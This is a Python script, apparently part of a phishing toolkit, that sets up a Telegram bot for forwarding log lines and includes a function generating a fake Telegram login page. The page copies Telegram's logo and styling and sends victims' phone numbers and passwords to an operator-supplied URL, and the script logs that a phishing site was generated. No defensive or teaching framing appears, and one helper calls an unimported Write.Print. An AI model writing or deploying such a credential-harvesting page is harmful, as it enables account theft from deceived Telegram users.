from telegram import Bot
import os
import time

# Глобальные переменные для токена и chat ID
TELEGRAM_TOKEN = None
CHAT_ID = None
bot = None


def init_telegram_bot(token, chat_id):
    global TELEGRAM_TOKEN, CHAT_ID, bot
    TELEGRAM_TOKEN = token
    CHAT_ID = chat_id
    bot = Bot(token=TELEGRAM_TOKEN)


def log_message(message, log_file='logs.txt', theme=None):
    # Запись сообщения в файл
    with open(log_file, 'a') as file:
        file.write(message + '\n')

    # Отображение сообщения в консоли
    if theme:
        Write.Print(message, theme)
    else:
        print(message)

    # Отправка сообщения в Telegram
    if bot:
        bot.send_message(chat_id=CHAT_ID, text=message)


def monitor_logs(log_file='logs.txt', theme=None):
    print("Monitoring logs. Type 'exit' to stop.")

    with open(log_file, 'r') as file:
        file.seek(0, os.SEEK_END)

        while True:
            line = file.readline()
            if line:
                if theme:
                    Write.Print(line.strip(), theme)
                else:
                    print(line.strip())

                # Отправка каждой новой строки в Telegram
                if bot:
                    bot.send_message(chat_id=CHAT_ID, text=line.strip())
            else:
                time.sleep(1)

            # Прерывание мониторинга по команде 'exit'
            if input().strip().lower() == 'exit':
                break


def generate_telegram_phishing_site(output_file, login_url):
    html_content = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Telegram Login</title>
        <style>
            body {{ font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, "Helvetica Neue", Arial, sans-serif; margin: 0; padding: 0; background-color: #e5e5e5; }}
            .container {{ max-width: 400px; margin: 60px auto; padding: 20px; background: white; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); text-align: center; }}
            h1 {{ color: #0088cc; font-size: 24px; margin-bottom: 20px; }}
            .logo {{ margin-bottom: 20px; }}
            .logo img {{ width: 120px; }}
            label {{ display: block; margin-bottom: 10px; text-align: left; }}
            input[type="text"], input[type="password"] {{ width: 100%; padding: 12px; margin: 5px 0 20px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }}
            input[type="submit"] {{ background-color: #0088cc; color: white; border: none; padding: 12px; border-radius: 5px; cursor: pointer; font-size: 16px; }}
            input[type="submit"]:hover {{ background-color: #006a99; }}
            .footer {{ margin-top: 20px; font-size: 14px; color: #888; }}
            .footer a {{ color: #0088cc; text-decoration: none; }}
            .footer a:hover {{ text-decoration: underline; }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Telegram_logo.svg/1280px-Telegram_logo.svg.png" alt="Telegram Logo">
            </div>
            <h1>Log in to Telegram</h1>
            <form action="{login_url}" method="post">
                <label for="phone">Phone number</label>
                <input type="text" id="phone" name="phone" placeholder="Enter your phone number" required><br>
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required><br>
                <input type="submit" value="Log in">
            </form>
            <div class="footer">
                <p>Don't have an account? <a href="#">Sign up</a></p>
                <p>Forgot your password? <a href="#">Reset it</a></p>
                <p><a href="https://telegram.org/privacy" target="_blank">Privacy Policy</a></p>
            </div>
        </div>
    </body>
    </html>
    """

    # Запись HTML в файл
    with open(output_file, "w") as file:
        file.write(html_content)

    log_message(f"Phishing site for Telegram generated and saved to {output_file}")
    log_message("Phishing site emulates Telegram login")
